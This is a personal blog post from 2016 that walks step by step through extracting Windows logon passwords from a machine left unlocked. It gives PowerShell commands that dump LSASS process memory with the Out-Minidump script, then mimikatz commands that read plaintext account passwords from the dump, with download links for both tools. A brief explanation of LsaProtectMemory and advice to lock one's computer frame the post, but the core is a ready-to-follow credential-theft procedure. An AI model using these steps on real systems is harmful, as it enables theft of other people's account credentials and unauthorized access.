<!DOCTYPE html><html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en" class="no-js" itemscope itemtype="http://schema.org/WebPage"><link href="http://gmpg.org/xfn/11" rel="profile"><meta charset="UTF-8"><meta name="apple-mobile-web-app-capable" content="yes"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1"><title> Your Windows passwords are vulnerable and hackable in less than 5 minutes · heiswayi nrird •••</title><meta name="description" content=" This is a simple how-to article demonstrating existing vulnerability that makes your Windows passwords are hackable. "/><meta name="keywords" content="Windows passwords, logon password, LsaProtectMemory, LsaUnprotectMemory, lsass.exe, Windows vulnerability, mimikatz terminal, powershell script, out-minidump, minidump"><meta name="author" content="Heiswayi Nrird"><meta name="HandheldFriendly" content="True"><meta name="MobileOptimized" content="320"><meta property="og:type" content="article"><meta property="article:author" content="Heiswayi Nrird"><meta property="article:section" content=""><meta property="article:tag" content="Windows passwords, logon password, LsaProtectMemory, LsaUnprotectMemory, lsass.exe, Windows vulnerability, mimikatz terminal, powershell script, out-minidump, minidump"><meta property="article:published_time" content="2016-12-29 00:00:00 +0800"><meta property="og:url" content="https://heiswayi.nrird.com/2016/your-windows-passwords-are-vulnerable-and-hackable-in-less-than-5-minutes"><meta property="og:title" content=" Your Windows passwords are vulnerable and hackable in less than 5 minutes · heiswayi nrird ••• "><meta property="og:image" content="https://heiswayi.nrird.com/assets/logo.png"><meta property="og:description" content=" This is a simple how-to article demonstrating existing vulnerability that makes your Windows passwords are hackable. "><meta property="og:site_name" content="Heiswayi Nrird"><meta property="og:locale" content="en_US"><meta name="twitter:card" content="summary_large_image"><meta name="twitter:site" content="@heiswayi"><meta name="twitter:title" content=" Your Windows passwords are vulnerable and hackable in less than 5 minutes · heiswayi nrird ••• "><meta name="twitter:description" content=" This is a simple how-to article demonstrating existing vulnerability that makes your Windows passwords are hackable. "><meta name="twitter:image:src" content="https://heiswayi.nrird.com/assets/logo.png"><meta itemprop="name" content=" Your Windows passwords are vulnerable and hackable in less than 5 minutes · heiswayi nrird ••• "><meta itemprop="description" content=" This is a simple how-to article demonstrating existing vulnerability that makes your Windows passwords are hackable. "><meta itemprop="image" content="https://heiswayi.nrird.com/assets/logo.png"><link rel="canonical" href="https://heiswayi.nrird.com/2016/your-windows-passwords-are-vulnerable-and-hackable-in-less-than-5-minutes"><link rel="alternate" type="application/rss+xml" title="RSS" href="https://heiswayi.nrird.com/feed.xml"><link rel="icon" type="image/png" href="data:image/png;base64,iVBORw0KGgo="><link rel="stylesheet" href="https://heiswayi.nrird.com/assets/css/main.css?20180603"> <script src="https://heiswayi.nrird.com/assets/js/modernizr.custom.js"></script> <!--[if lt IE 9]> <script src="http://cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.2/html5shiv.min.js"></script> <script src="http://cdnjs.cloudflare.com/ajax/libs/respond.js/1.1.0/respond.min.js"></script> <script src="https://heiswayi.nrird.com/assets/js/rem.min.js"></script> <![endif]--> <a href="#content" class="skip">Skip to content</a><div class="wrap"><div class="masthead"> <canvas id="canvas" style="width:100%;height:100%;max-height:230px;position:absolute;z-index:1;opacity:0.5"></canvas><div class="container"><h2 class="masthead-title"> <a href="https://heiswayi.nrird.com" title="heiswayi nrird •••" class="title">heiswayi nrird <span class="dot-red">•</span><span class="dot-yellow">•</span><span class="dot-green">•</span></a> <small>Between coding and random stuffs </small></h2><div class="footer-social-links"> <a href="http://heiswayi.github.io/feed.xml" title="RSS Feed" target="_blank"><i class="fa fa-rss"></i></a> <a href="https://my.linkedin.com/in/nrird" title="LinkedIn" target="_blank"><i class="fa fa-linkedin"></i></a> <!--<a href="https://www.facebook.com/heiswayi.nrird" title="Facebook" target="_blank"><i class="fa fa-facebook"></i></a>--> <!--<a href="https://twitter.com/HeiswayiNrird" title="Twitter" target="_blank"><i class="fa fa-twitter"></i></a>--> <a href="http://heiswayi.github.io/my-repos/" title="GitHub Repositories" target="_blank"><i class="fa fa-github-alt"></i></a> <a href="http://heiswayi.github.io/my-gists/" title="GitHub Gists" target="_blank"><i class="fa fa-code"></i></a> <a href="http://codepen.io/heiswayi/" title="CodePen" target="_blank"><i class="fa fa-codepen"></i></a> <a href="https://instagram.com/heiswayi.nrird/" title="Instagram" target="_blank"><i class="fa fa-instagram"></i></a> <a href="http://jsfiddle.net/user/heiswayi/" title="JSFiddle" target="_blank"><i class="fa fa-jsfiddle"></i></a></div><div class="nav"><ul class="top-menu"><li><a href="https://heiswayi.nrird.com/" title="Home"><i class="fa fa-home"></i></a><li><a href="https://heiswayi.nrird.com/about">About</a> <!--<li><a href="/resume">Resume <i class="fa fa-external-link-square"></i></a>--><li><a href="https://heiswayi.nrird.com/projects" class="bg-red"><i class="fa fa-space-shuttle" aria-hidden="true"></i> Projects</a><li><a href="https://heiswayi.nrird.com/tagged">Tags</a><li><a href="https://heiswayi.github.io/photography">Photography <i class="fa fa-external-link-square"></i></a><li><a href="https://heiswayi.nrird.com/reminder">Reminder</a></ul></div></div></div><div id="content" class="container content"><div class="post"><div class="post-top-meta"> <!--<div class="edit-this-page"><a href="https://github.com/heiswayi/heiswayi.github.io/blob/master/_posts/2016/2016-12-29-your-windows-passwords-are-vulnerable-and-hackable-in-less-than-5-minutes.md">Edit this page</a></div>--><div class="post-date">December 29, 2016</div><h1 class="post-title">Your Windows passwords are vulnerable and hackable in less than 5 minutes</h1></div><p><strong>Did you know that your Windows passwords are vulnerable and hackable in less than 5 minutes?</strong><p>Yep, even in Windows 10, the method is still working nicely. <strong>The method is not new at all.</strong> So, let me show how you can reproduce it by using a simple exploitation tool and a PowerShell script. <strong>Anyone can perform this hacking when you left your computer unlocked.</strong> I’m not really going to explain the details, just go straight to the steps. Google Search is on your fingertips if you are keen to explore more.<h3 id="getting-started">Getting started</h3><p>First, you need to download or get this tool called <a href="https://github.com/gentilkiwi/mimikatz/releases/latest">mimikatz</a> (just get the binary package, e.g. <strong>mimikatz_trunk.zip</strong>) and this PowerShell script <a href="https://raw.github.com/mattifestation/PowerSploit/master/Exfiltration/Out-Minidump.ps1">Out-Minidump.ps1</a> by Matthew Graeber. Let’s start!<h3 id="using-powershell-to-perform-memory-dump">Using PowerShell to perform memory dump</h3><p>To perform the <a href="https://technet.microsoft.com/en-us/library/cc961760.aspx">LSASS</a> dump, we will use the PowerShell script, <strong>Out-Minidump.ps1</strong>. The flow of cmdlet will look like this:<p><img src="http://i.imgur.com/1lQnyhZ.png" alt="PowerShell cmdlet" /><div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">.</span> <span class="s1">'G:\USERFILES\Desktop\PowerShell Playground\Out-Minidump.ps1'</span>
<span class="c1"># "dot sourcing" method to import function from the script</span>

<span class="nb">Get-Process </span>lsass | Out-Minidump
<span class="c1"># To perform the LSASS dump</span>

<span class="nb">Copy-Item</span> .\lsass_868.dmp <span class="s1">'G:\USERFILES\Desktop\PowerShell Playground'</span>
<span class="c1"># Copy the dump file to desired location</span>
</code></pre></div></div><h3 id="using-mimikatz-terminal-program-to-view-the-passwords">Using mimikatz terminal program to view the passwords</h3><p>As you can see, <code class="highlighter-rouge">lsass_868.dmp</code> is the example of LSASS dump file captured using the PowerShell script. Now, it’s time we use the mimikatz terminal to load in the dump file as follows:<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sekurlsa::minidump "G:\USERFILES\Desktop\PowerShell Playground\lsass_868.dmp"
</code></pre></div></div><p><img src="http://i.imgur.com/OPA0g0w.png" alt="mimikatz MINIDUMP" /><p>Switching to MINIDUMP file, so now we can view the passwords. Now, run this command to display all the accounts and passwords available:<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sekurlsa::logonPasswords full
</code></pre></div></div><p><img src="http://i.imgur.com/nWPZUIR.jpg" alt="mimikatz logonPasswords" /><p>Tadaa… Now I can see my actual Microsoft Account username and password in <strong>a plain text</strong>. As you imagine, most of people nowadays are still using the same password for almost everything. <em>Too bad..</em> So, I expected you can picture all the consequences with this vulnerability…<h3 id="the-existing-vulnerability-info">The existing vulnerability info</h3><p>The fact is that the password is encrypted but it’s useless as the implementation depends on two basic Win32 functions; <a href="https://msdn.microsoft.com/en-us/library/windows/desktop/ff714509%28v=vs.85%29.aspx">LsaProtectMemory</a> (the encryption function) and <a href="https://msdn.microsoft.com/en-us/library/windows/desktop/ff714510(v=vs.85).aspx">LsaUnprotectMemory</a> (the decryption function). And Windows stores encrypted user passwords in memory without using one-way hash which is decryptable using <strong>LsaUnprotectMemory</strong> function to a plain text.<h3 id="the-bottom-line">The bottom line</h3><p>You will be safe as long as you always lock your computer when you’re away. For more explanations and security advices, you might want to check the <a href="http://www.fixedbyvonnie.com/2015/02/hack-passwords-of-windows-in-5-minutes">original article here</a>. This short article is just to remind me or anyone else to always be careful in whatever we do especially with anything to do with our passwords and personal credential information. No system is perfect! DON’T LEAVE YOUR COMPUTER UNLOCKED.<div class="tagged"> <a href="https://heiswayi.nrird.com/tagged#windows"><i class="fa fa-hashtag muted" aria-hidden="true"></i>Windows</a> <a href="https://heiswayi.nrird.com/tagged#powershell"><i class="fa fa-hashtag muted" aria-hidden="true"></i>PowerShell</a> <a href="https://heiswayi.nrird.com/tagged#vulnerability"><i class="fa fa-hashtag muted" aria-hidden="true"></i>Vulnerability</a> <a href="https://heiswayi.nrird.com/tagged#encryption"><i class="fa fa-hashtag muted" aria-hidden="true"></i>Encryption</a> <a href="https://heiswayi.nrird.com/tagged#decryption"><i class="fa fa-hashtag muted" aria-hidden="true"></i>Decryption</a></div><div id="disqus" style="margin-top:2em"><div id="disqus_thread"></div><script> var disqus_config = function() { this.page.url = "https://heiswayi.nrird.com/2016/your-windows-passwords-are-vulnerable-and-hackable-in-less-than-5-minutes"; this.page.identifier = "/2016/your-windows-passwords-are-vulnerable-and-hackable-in-less-than-5-minutes"; }; (function() { var d = document, s = d.createElement('script'); s.src = '//hnbloggithub.disqus.com/embed.js'; s.setAttribute('data-timestamp', +new Date()); (d.head || d.body).appendChild(s); })(); </script> <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></div></div></div></div><div class="footer"><div class="copyright"><i class="fa fa-copyright"></i> 2015 - 2018 Heiswayi Nrird // <a href="https://heiswayi.nrird.com/cookie-policy">Cookie Policy</a> // <a href="https://heiswayi.github.io/feed.xml">RSS</a></div></div><script> // Line numbering for code block (function() { var pre = document.getElementsByTagName('pre'), pl = pre.length; for (var i = 0; i < pl; i++) { pre[i].innerHTML = '<span class="line-number"></span>' + pre[i].innerHTML + '<span class="cl"></span>'; var num = pre[i].innerHTML.split(/\n/).length; for (var j = 0; j < (num - 1); j++) { var line_num = pre[i].getElementsByTagName('span')[0]; line_num.innerHTML += '<span>' + (j + 1) + '</span>'; } } })(); </script> <script> (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){ (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o), m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m) })(window,document,'script','https://www.google-analytics.com/analytics.js','ga'); ga('create', 'UA-58296043-7', 'auto'); ga('send', 'pageview'); </script>
